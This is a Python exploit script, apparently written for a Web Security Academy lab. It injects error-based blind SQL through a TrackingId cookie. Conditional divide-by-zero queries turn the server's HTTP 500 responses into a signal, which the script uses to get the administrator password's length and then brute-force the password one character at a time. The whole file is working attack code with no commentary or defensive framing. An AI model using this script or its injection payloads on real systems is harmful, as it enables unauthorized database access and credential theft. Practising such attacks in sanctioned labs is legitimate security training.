import requests
import string

url = "https://0a3200a4034e47078028a89900eb007d.web-security-academy.net/"
cookie_name = "TrackingId"
cookie_value = "auVUDxZoVEWwzBw8"

# Obtain password length
injection = "' AND (SELECT CASE WHEN \
    (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = {}) \
    THEN 1/0 ELSE 1 END FROM dual) = 1  --"
password_length = 1
while True:
    # Make request
    cookies = {cookie_name: cookie_value + injection.format(password_length)}
    print(cookies[cookie_name])
    r = requests.get(url, cookies=cookies)
    if r.status_code == 500:
        break
    else:
        password_length += 1

# Obtain password
injection = "' AND (SELECT CASE WHEN \
    (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {char_index}, 1) = '{char}') \
    THEN 1/0 ELSE 1 END FROM dual) = 1 --"
password = ""
for char_index in range(1, password_length+1):
    for char in string.ascii_lowercase + string.digits:
        cookies = {cookie_name: cookie_value + injection.format(char_index=char_index, char=char)}
        print(cookies[cookie_name])
        r = requests.get(url, cookies=cookies)
        if r.status_code == 500:
            password += char
            break

print(password)